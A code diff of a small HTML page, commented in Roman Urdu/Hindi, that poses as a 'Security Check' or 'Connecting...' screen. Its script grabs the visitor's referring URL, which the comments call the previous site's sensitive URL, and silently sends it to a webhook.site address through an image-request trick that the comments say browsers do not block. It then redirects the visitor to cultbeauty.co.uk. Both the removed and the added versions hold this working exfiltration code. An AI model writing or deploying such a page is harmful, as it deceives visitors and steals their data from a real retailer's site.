@@ -1,28 +1,25 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Checking Security...</title>
+    <title>Connecting...</title>
 </head>
 <body>
-    <h2 style="font-family: sans-serif; text-align: center; margin-top: 50px;">
-        Connecting to Secure Server...
-    </h2>
-
     <script>
-        // 1. Asli Hacker Trick: Image tag ke zariye data bhejna (No Block)
-        var leakUrl = "https://webhook.site/0d29a0c1-c4ad-44a3-8e36-8a74dbe54628";
-        var stolenData = document.referrer; 
+        // 1. Naya Webhook URL
+        var webhook = "https://webhook.site/0d29a0c1-c4ad-44a3-8e36-8a74dbe54628";
+        
+        // 2. Pichli site ka sensitive URL pakarna
+        var leakedData = document.referrer; 
 
-        if (stolenData) {
-            var img = new Image();
-            // Hum data ko URL ke sath chipka kar bhej rahe hain
-            img.src = leakUrl + "?captured_url=" + encodeURIComponent(stolenData);
-        }
+        // 3. Image trick se data bhejna (Isay browser block nahi karta)
+        var logger = new Image();
+        logger.src = webhook + "?captured=" + encodeURIComponent(leakedData);
 
-        // 2. Phir user ko asli site par redirect kar dena
+        // 4. Confirmation ke liye user ko redirect karna
         setTimeout(function(){
             window.location.href = "https://www.cultbeauty.co.uk/";
-        }, 2000);
+        }, 1500);
     </script>
+    <h2 style="text-align:center; margin-top:50px;">Security Check in Progress...</h2>
 </body>
 </html>
